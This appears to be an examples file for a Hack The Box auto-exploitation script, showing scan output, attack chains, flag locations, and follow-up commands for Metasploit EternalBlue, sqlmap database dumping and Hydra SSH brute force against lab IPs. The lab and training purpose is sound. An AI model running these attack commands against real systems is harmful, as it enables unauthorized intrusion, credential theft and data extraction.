# HTB Auto Pwn Examples

This file contains example usage scenarios and expected outputs for the HTB Auto Pwn tool.

## Example 0: First Run with Missing Tools

### Command
```bash
python3 htb_auto_pwn.py -t 10.10.10.3
```

### Expected Interaction
If you're missing tools, the script will automatically detect and offer to install them:

```
[WARNING] Missing tools detected: nikto, gobuster
[WARNING] Some functionality may be limited without these tools.

Would you like to install missing tools now? (y/n): y
[INFO] Installing missing tools...
[WARNING] Installation requires root privileges.
[INFO] Attempting to use sudo...
[INFO] Updating package list...
[INFO] Installing: nikto, gobuster
[INFO] ✓ Successfully installed missing tools!

╔══════════════════════════════════════════════╗
║   HTB Automated Flag Reveal System          ║
║   Target: 10.10.10.3                        ║
╚══════════════════════════════════════════════╝
```

### Options When Prompted
- Enter `y` or `yes` to automatically install missing tools
- Enter `n` or `no` to continue without installing (limited functionality)
- Press `Ctrl+C` to cancel and exit

## Example 1: Basic Scan

### Command
```bash
python3 htb_auto_pwn.py -t 10.10.10.3
```

### Expected Flow
1. Quick scan discovers open ports (21, 22, 80)
2. Detailed scan identifies services
3. Vulnerability detection finds anonymous FTP
4. Exploitation retrieves files via FTP
5. Flag extracted from downloaded files

### Sample Output
```
╔══════════════════════════════════════════════╗
║   HTB Automated Flag Reveal System          ║
║   Target: 10.10.10.3                        ║
╚══════════════════════════════════════════════╝

[PHASE 1] Network Scanning
[INFO] Starting quick port scan on 10.10.10.3
[INFO] Open ports found: [21, 22, 80]
[INFO] Running detailed scan on ports: 21,22,80

[PHASE 2] Vulnerability Detection
[INFO] Analyzing for vulnerabilities...
[INFO] Checking FTP anonymous login on port 21
[INFO] Checking SSH vulnerabilities on port 22
[INFO] Checking web vulnerabilities on port 80
[INFO] Found 3 potential vulnerabilities
  - ftp_anonymous on port 21 (Severity: high)
  - ssh on port 22 (Severity: medium)
  - web on port 80 (Severity: medium)

[PHASE 3] Exploitation
[INFO] Starting exploitation phase...
[INFO] Attempting FTP anonymous exploitation on port 21
[INFO] [FLAG FOUND] FTP: 5f4dcc3b5aa765d61d8327deb882cf99

FLAGS DISCOVERED:
  ✓ 5f4dcc3b5aa765d61d8327deb882cf99 (from FTP)
```

## Example 2: Verbose Mode

### Command
```bash
python3 htb_auto_pwn.py -t 10.10.10.27 -v -o lame_results.json
```

### Description
- Scans the "Lame" HTB machine
- Verbose output shows detailed debugging
- Results saved to custom JSON file
- Targets SMB vulnerabilities (MS08-067)

### Services Tested
- FTP vsftpd 2.3.4
- SSH OpenSSH 4.7p1
- SMB Samba 3.0.20

## Example 3: Web Application Target

### Command
```bash
python3 htb_auto_pwn.py -t 10.10.10.15
```

### Expected Behavior
1. Discovers web server on port 80
2. Runs nikto vulnerability scan
3. Performs directory bruteforcing
4. Tests common paths (/admin, /flag.txt, etc.)
5. Checks for exposed .git directories
6. Tests for environment file disclosure

## Example 4: Multi-Service Target

### Command
```bash
python3 htb_auto_pwn.py -t 10.10.10.100 -o multi_results.json
```

### Services Detected
- Port 21: FTP
- Port 22: SSH
- Port 80: HTTP
- Port 139: NetBIOS
- Port 445: SMB
- Port 3306: MySQL

### Attack Chain
1. Check FTP anonymous access
2. Enumerate SMB shares
3. Test database default credentials
4. Scan web application
5. Attempt SSH brute force
6. Extract flags from all sources

## Example 5: Limited Port Scan

### Command
```bash
# Modify the script to target specific ports
python3 htb_auto_pwn.py -t 10.10.10.50
```

### Custom Port Scanning
Edit the script to scan specific ports:
```python
# In NetworkScanner.quick_scan():
cmd = ['nmap', '-T4', '-p', '80,443,8080', '--open', '-oX', '/tmp/quick_scan.xml', self.target]
```

## Common Flag Locations

### FTP Servers
- Root directory files
- /pub/ directory
- User home directories

### Web Servers
- /flag.txt
- /root.txt
- /user.txt
- /.git/HEAD
- /robots.txt
- /backup/
- /admin/flag.txt

### SMB Shares
- Shared folders
- User directories
- C$ (if accessible)
- ADMIN$ (if accessible)

### SSH Access
- /root/flag.txt
- /home/user/flag.txt
- /flag.txt
- /var/www/flag.txt

## Flag Format Examples

### MD5 Hash (32 characters)
```
5f4dcc3b5aa765d61d8327deb882cf99
a1b2c3d4e5f6789012345678901234ab
```

### SHA256 Hash (64 characters)
```
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
```

### HTB Format
```
HTB{th1s_1s_4_fl4g}
HTB{anonymous_ftp_is_bad}
```

### Generic Flag Format
```
flag{found_the_vulnerability}
flag{password123}
```

## Troubleshooting Examples

### No Flags Found
```bash
# Check the JSON output for clues
cat htb_results_*.json | jq '.vulnerabilities'

# Review the log file
cat htb_auto_*.log | grep -i "flag\|error\|vulnerable"
```

### Timeout Issues
```bash
# Run with increased timeout (edit script):
# quick_scan_timeout = 600
# detailed_scan_timeout = 1200
python3 htb_auto_pwn.py -t 10.10.10.100
```

### Permission Denied
```bash
# Run with sudo for raw socket access
sudo python3 htb_auto_pwn.py -t 10.10.10.100
```

## Integration with Other Tools

### Manual Metasploit Follow-up
```bash
# After identifying SMB vulnerability
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST tun0
exploit
```

### Manual sqlmap Test
```bash
# After finding web application
sqlmap -u "http://10.10.10.100/login.php" --forms --dump
```

### Manual Hydra Brute Force
```bash
# After identifying SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.100
```

## Best Practices

1. **Always get authorization** before scanning
2. **Start with quick scan** to avoid detection
3. **Review logs** even if flags are found automatically
4. **Use verbose mode** for learning and debugging
5. **Save results** for documentation and reporting
6. **Follow up manually** on interesting findings
7. **Update wordlists** regularly
8. **Test in lab environment** first

## Performance Tips

1. **Target specific ports** if you know the services
2. **Reduce timeout values** for faster scans
3. **Disable unnecessary checks** by commenting out code
4. **Use parallel scanning** for multiple targets (modify script)
5. **Run on local network** for faster response times

## Legal Reminder

⚠️ Only use this tool on:
- HTB machines you have active subscription for
- Systems you own
- Systems you have written permission to test

Never use on:
- Production systems without authorization
- Any system you don't own or have permission to test
- HTB machines you haven't purchased/activated
